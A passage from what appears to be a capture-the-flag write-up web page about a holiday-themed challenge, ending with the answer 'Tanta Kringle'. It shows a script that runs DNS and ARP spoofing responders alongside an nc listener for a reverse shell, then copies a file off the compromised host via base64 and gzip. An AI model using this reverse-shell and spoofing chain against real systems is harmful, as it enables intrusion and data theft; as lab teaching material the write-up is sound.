+the Python HTTP server. Finally, add a listener to the shell script:</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/sh</span>
+
+python3 dns_resp.py <span class="p">&amp;</span>
+python3 arp_resp.py <span class="p">&amp;</span>
+nc -vnlp <span class="m">10444</span>
+</code></pre></div>
+<p>Run the script, and wait for the reverse shell from the compromised host. Once we see
+the <code>connect to ...</code> message from <code>nc</code>, we know the reverse shell was successful:</p>
+<p><img alt="Successful reverse shell" src="../../img/9/o9-6.png" /></p>
+<p>We can use the same copy/paste method to transfer the <code>/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt</code> file out of the terminal and to our local machine:</p>
+<p><img alt="Grab the file" src="../../img/9/o9-7.png" /></p>
+<p>And do the reverse on our local machine: <code>base64 -d | gunzip &gt;
+NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt</code>. Reading the relatively mundane meeting
+minutes from the North Pole Land Use board, we see that <strong><code>Tanta Kringle</code></strong> recused
+herself from voting on the Kringle Castle expansion plans.</p>
+<h2 id="answer">Answer<a class="headerlink" href="#answer" title="Permanent link">#</a></h2>
+<p><code>Tanta Kringle</code></p>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../8/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Broken Tag Generator
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../10/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Defeat Fingerprint Sensor
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Joe Ammond - <a href="http://twitter.com/joeammond">@joeammond</a>
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+  <div class="md-footer-social">
+    
+      
+      
+        
+        
+      
+      <a href="https://twitter.com/joeammond" target="_blank" rel="noopener" title="twitter.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+      </a>
+    
+      
+      
+        
+        
+      
+      <a href="https://www.linkedin.com/in/joeammond/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+      </a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/vendor.08c56446.min.js"></script>
+      <script src="../../assets/javascripts/bundle.6ced434e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../..",
+          features: [],
+          search: Object.assign({
+            worker: "../../assets/javascripts/worker/search.8c7e0a7e.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
